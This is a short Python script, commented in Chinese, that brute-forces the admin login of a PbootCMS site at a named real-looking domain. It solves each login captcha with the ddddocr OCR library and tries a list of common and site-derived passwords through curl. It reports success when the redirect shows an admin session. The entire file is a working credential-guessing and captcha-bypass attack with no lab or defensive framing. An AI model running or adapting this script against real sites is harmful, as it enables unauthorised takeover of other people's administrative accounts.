"""ddddocr + PbootCMS自动爆破登录"""
import subprocess, ddddocr, time

BASE = "http://yurenmed.com"
COOKIE = "/tmp/yu_brute.txt"
PASSWORDS = ["admin", "admin123", "123456", "admin888", "yurenmed", "yuren123", "pboot123", "password"]
OCR = ddddocr.DdddOcr()

def get_captcha():
    subprocess.run(["rm", "-f", COOKIE])
    subprocess.run(["curl", "-sk", BASE + "/", "-c", COOKIE, "-o", "/dev/null"], capture_output=True)
    subprocess.run(["curl", "-sk", BASE + "/core/code.php", "-b", COOKIE, "-c", COOKIE, "-o", "/tmp/yu_cap.png"], capture_output=True)
    with open("/tmp/yu_cap.png", "rb") as f:
        data = f.read()
    if len(data) < 100: return None
    return OCR.classification(data).strip()

def try_login(user, pwd, code):
    r = subprocess.run(["curl", "-sk", "-X", "POST", BASE + "/admin.php/index/login",
        "-d", f"username={user}&password={pwd}&checkcode={code}",
        "-b", COOKIE, "-c", COOKIE, "-D", "/tmp/yu_hdr.txt", "-o", "/dev/null"],
        capture_output=True, text=True, timeout=10)
    with open("/tmp/yu_hdr.txt") as f:
        hdrs = f.read()
    for line in hdrs.split("\n"):
        if line.lower().startswith("location:"):
            return line.strip()
    return ""

for pw in PASSWORDS:
    for attempt in range(3):
        code = get_captcha()
        if not code:
            print(f"  {pw}: captcha fail")
            continue
        loc = try_login("admin", pw, code)
        if "index/home" in loc or "index/index" in loc:
            print(f"\n[!] LOGIN OK: admin:{pw} code={code}")
            print(f"    Redirect: {loc}")
            exit(0)
        print(f"  {pw}: code={code} -> fail")
        time.sleep(1)
    print()

print("\n全部密码失败")
